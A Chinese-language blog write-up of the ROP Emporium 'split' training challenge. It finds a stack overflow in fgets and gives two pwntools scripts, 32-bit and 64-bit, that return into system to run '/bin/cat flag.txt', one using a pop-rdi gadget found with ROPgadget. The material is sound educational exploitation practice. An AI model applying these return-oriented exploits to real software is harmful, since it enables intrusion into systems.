---
title: ROP Emporium の split
date: 2020-05-27 13:30:29
categories:
- WriteUPs
- ROP Emprium
tags:
- PWN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;[ROP Emporium](https://ropemporium.com)训练1：split的解析。

<!-- more -->

## split32

### Step 1

&emsp;&emsp;程序正常运行截图：

![](/img/split/split1.png)

&emsp;&emsp;checksec：32位程序，只开启了DEP保护

![](/img/split/split2.png)

### Step 2

&emsp;&emsp;把程序丢到hopper中看下，发现在pwnme函数中fgets函数存在溢出漏洞：

![](/img/split/split3.png)

&emsp;&emsp;同时程序中存在system函数，可以执行系统命令：

![](/img/split/split4.png)

&emsp;&emsp;再找下程序中有没有’/bin/sh’字符串：

![](/img/split/split5.png)

&emsp;&emsp;可惜，没有找到。不过在hopper中看到一个有趣的字符串“/bin/ls”：

![](/img/split/split6.png)

&emsp;&emsp;有这个也无法看到flag，那么再去找一下“flag.txt”字符串：

![](/img/split/split7.png)

&emsp;&emsp;Surprise！！！居然有“/bin/cat flag.txt”字符串。到此思路就清晰了，fgets函数溢出覆盖返回地址跳转到system执行“/bin/cat flag.txt”的命令即可。

### Step 3

&emsp;&emsp;话不多说，直接上EXP：

```Python
* from pwn import *
* sh = process('./split32')
* elf = ELF('./split32')
* 
* system_addr = elf.symbols['system']
* shell_addr = elf.search('/bin/cat').next()
* 
* payload = 'a' * (0x28 + 0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(shell_addr)
* 
* sh.recvuntil('>')
* sh.send(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;代码运行结果：

![](/img/split/split8.png)

## split

### Step 1

&emsp;&emsp;程序运行截图：

![](/img/split/split9.png)

&emsp;&emsp;checksec还是一样的仅开启DEP保护，只是程序变成了64位：

![](/img/split/split10.png)

### Step 2

&emsp;&emsp;将程序丢到hopper中发现解题的逻辑和split32一模一样，fgets函数溢出覆盖返回地址到system函数，执行“/bin/cat flag.txt”命令.

&emsp;&emsp;与32位程序不同的有两点：

* 一是偏移量不同，这点简单明了

* 二是32位和64位程序传参方式的不同，具体可以参考[XMAN level2_x64 の Write-Up](https://coldwave96.github.io/2020/05/11/XMAN-level2-x64/)

### Step 3

&emsp;&emsp;比较简单，还是直接给出EXP：

```Python
* from pwn import *
* 
* sh = process('./split')
* elf = ELF('./split')
* 
* system_addr = elf.symbols['system']
* rop_addr = 0x0000000000400883
* shell_addr = elf.search('/bin/cat').next()
* 
* payload = 'a' * (0x20 + 0x8) + p64(rop_addr) + p64(shell_addr) + p64(system_addr)
* 
* sh.recvuntil('>')
* sh.send(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;其中rop_addr是通过`ROPgadget --binary ./split --only 'pop|ret’`命令找到的：

![](/img/split/split11.png)

&emsp;&emsp;EXP脚本运行结果图：

![](/img/split/split12.png)